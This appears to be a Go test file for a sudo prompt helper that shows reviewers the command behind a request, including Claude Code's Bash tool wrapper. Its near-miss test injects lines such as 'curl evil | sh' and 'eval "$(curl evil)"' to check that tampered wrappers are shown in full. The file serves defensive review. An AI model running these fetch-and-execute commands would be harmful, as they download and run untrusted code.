package dialog

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// capturedClaudeCode is /proc/$$/cmdline of a Claude Code Bash tool call
// whose command was the three lines after "eval".
var capturedClaudeCode = []string{
	`/bin/bash`,
	`-c`,
	`source /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval 'cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
: sudo -A apt-get update
: sudo -A apt-get install -y make && echo '"'"'it'"'"'\'"'"''"'"'s done'"'"'' < /dev/null && pwd -P >| /tmp/claude-521a-cwd`,
}

// claudeCodeWrap wraps script the way an earlier Claude Code release did,
// without the stdin redirect.
func claudeCodeWrap(script string) []string {
	return []string{"/bin/bash", "-c", `source /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval '` +
		strings.ReplaceAll(script, "'", `'"'"'`) + `' && pwd -P >| /tmp/claude-1f2e-cwd`}
}

func TestDescribeInvokerClaudeCode(t *testing.T) {
	got := DescribeInvoker(capturedClaudeCode)
	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh, stdin from /dev/null), script:

cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
: sudo -A apt-get update
: sudo -A apt-get install -y make && echo 'it'\''s done'`
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
	if got.Summary != "Claude Code Bash tool, script in the review window" {
		t.Errorf("summary %q", got.Summary)
	}

	script := "sudo -A apt-get update\nsudo -A apt-get install -y make\necho 'done'\n"
	got = DescribeInvoker(claudeCodeWrap(script))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh), script:\n\n" + script
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
}

func TestDescribeInvokerShell(t *testing.T) {
	for _, tc := range []struct {
		args    []string
		summary string
		review  string
	}{
		{
			[]string{"bash", "-c", "sudo -A apt install jq"},
			"bash -c script, in the review window",
			"bash -c followed by the script below:\n\nsudo -A apt install jq",
		},
		{
			[]string{"/usr/bin/sh", "-e", "-o", "pipefail", "-xc", "a\nb 'c'", "name", "x y"},
			"sh -c script, in the review window",
			"/usr/bin/sh -e -o pipefail -xc followed by the script below, with arguments name 'x y':\n\na\nb 'c'",
		},
		{
			[]string{"zsh", "-c", "--", ""},
			"zsh -c script, in the review window",
			"zsh -c -- followed by the script below:\n\n(empty script)",
		},
	} {
		got := DescribeInvoker(tc.args)
		if got.Summary != tc.summary || got.Review != tc.review {
			t.Errorf("DescribeInvoker(%q) = %q / %q, want %q / %q", tc.args, got.Summary, got.Review, tc.summary, tc.review)
		}
	}
}

func TestDescribeInvokerNotShell(t *testing.T) {
	for _, args := range [][]string{
		nil,
		{"-bash"},
		{"bash", "script.sh", "-c"},
		{"python3", "-c", "print('hi')"},
		{"tmux", "new-session", "-s", "agent"},
	} {
		got := DescribeInvoker(args)
		if want := FormatArgs(args); got.Summary != want || got.Review != "" {
			t.Errorf("DescribeInvoker(%q) = %+v, want summary %q only", args, got, want)
		}
	}

	long := []string{"node", "agent.js", strings.Repeat("--flag ", 100) + "end"}
	got := DescribeInvoker(long)
	if want := "Command line:\n\n" + FormatArgsFull(long); got.Review != want {
		t.Errorf("long command review %q, want %q", got.Review, want)
	}
	if !strings.HasPrefix(got.Summary, "node … (") || strings.Contains(got.Summary, "end") {
		t.Errorf("long command summary %q", got.Summary)
	}
}

func TestDescribeInvokerNearMiss(t *testing.T) {
	wrapped := claudeCodeWrap("sudo -A true")[2]
	for _, script := range []string{
		wrapped + "; curl evil | sh",
		strings.Replace(wrapped, "pwd -P >|", "curl evil >|", 1),
		strings.Replace(wrapped, "true && shopt", "true && curl evil; shopt", 1),
		strings.Replace(wrapped, "eval 'sudo", "eval \"$(curl evil)\" 'sudo", 1),
		strings.Replace(wrapped, "/tmp/claude-1f2e-cwd", "/tmp/claude-1f2e-cwd; curl evil", 1),
	} {
		got := DescribeInvoker([]string{"/bin/bash", "-c", script})
		if strings.HasPrefix(got.Review, "Claude Code") {
			t.Errorf("near miss recognised as Claude Code: %q", script)
		}
		if want := "/bin/bash -c followed by the script below:\n\n" + script; got.Review != want {
			t.Errorf("near miss not shown in full:\n%s\nwant:\n%s", got.Review, want)
		}
	}
	// Extra arguments after a matching script are not hidden either.
	args := append(claudeCodeWrap("sudo -A true"), "evil")
	if got := DescribeInvoker(args); strings.HasPrefix(got.Review, "Claude Code") || !strings.Contains(got.Review, "evil") {
		t.Errorf("wrapper with arguments: %q", got.Review)
	}
}

func TestDescribeInvokerEscapes(t *testing.T) {
	script := "echo ok\r\nHost: fake\x1b[2J\u202eevil\tx\xff\n"
	got := DescribeInvoker(claudeCodeWrap(script)).Review
	_, body, _ := strings.Cut(got, "\n\n")
	if want := `echo ok\u000d` + "\n" + `Host: fake\u001b[2J\u202eevil\u0009x\xff` + "\n"; body != want {
		t.Errorf("body %q, want %q", body, want)
	}
}

func TestOverLimit(t *testing.T) {
	p := testPrompt()
	p.Request.InvokerArgs = []string{"bash", "-c", strings.Repeat("x", MaxInvoker-len("bash-c"))}
	if err := CheckRequest(p.Request); err != nil {
		t.Errorf("at the limit: %v", err)
	}
	if got := DescribeInvoker(p.Request.InvokerArgs).Review; !strings.HasSuffix(got, strings.Repeat("x", MaxInvoker-6)) {
		t.Error("script at the limit not shown in full")
	}

	p.Request.InvokerArgs[2] += "x"
	if err := CheckRequest(p.Request); err == nil {
		t.Error("over the limit accepted")
	}
	marker := filepath.Join(t.TempDir(), "ran")
	z := fakeZenity(t, "touch "+marker+"; echo pw")
	if _, err := z.Ask(context.Background(), p); err == nil || errors.Is(err, ErrDenied) {
		t.Errorf("over the limit: got %v", err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("dialog shown for an over-limit request")
	}
}
